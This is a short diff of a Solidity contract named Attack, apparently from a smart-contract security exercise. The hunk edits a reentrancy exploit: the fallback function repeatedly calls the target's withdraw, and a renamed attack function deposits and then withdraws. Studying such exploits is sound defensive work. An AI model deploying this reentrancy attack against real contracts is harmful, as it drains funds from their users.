@@ -94,13 +94,13 @@ contract Attack {
     }
 
     function () external payable {
-        
         reentrancy.withdraw(msg.value);
+        
     }
 
-    function attack() public payable {
+    function attackreentrancy() public payable {
         reentrancy.deposit.value(msg.value)();
-        reentrancy.withdraw(msg.value);
+        reentrancy.withdraw(msg.value-1);
 
     }
 
